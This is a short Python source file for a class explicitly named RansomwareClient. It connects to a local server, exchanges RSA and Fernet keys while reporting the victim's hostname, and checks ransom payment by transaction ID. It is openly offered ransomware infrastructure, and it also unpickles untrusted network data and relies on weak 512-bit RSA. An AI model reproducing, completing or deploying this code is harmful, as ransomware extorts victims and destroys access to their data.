from socket import *
import rsa
import pickle
from cryptography.fernet import Fernet


class RansomwareClient:
    def __init__(self):
        host = '127.0.0.1'
        port = 17694
        self.my_socket = socket()
        self.my_socket.connect((host, port))
        publickey, privatekey = rsa.newkeys(512)
        self.my_socket.send(pickle.dumps((publickey, gethostname())))
        received_key = pickle.loads(self.my_socket.recv(1024))
        symmetric_key = rsa.decrypt(received_key, privatekey)
        self.fernet = Fernet(symmetric_key)

    def check_payment(self, transaction_id):
        self.my_socket.send(self.fernet.encrypt(transaction_id.encode()))
        print("sent the api request")
        answer = pickle.loads(self.fernet.decrypt(self.my_socket.recv(1024)))  # CODES:
        print("got answer")
        return answer
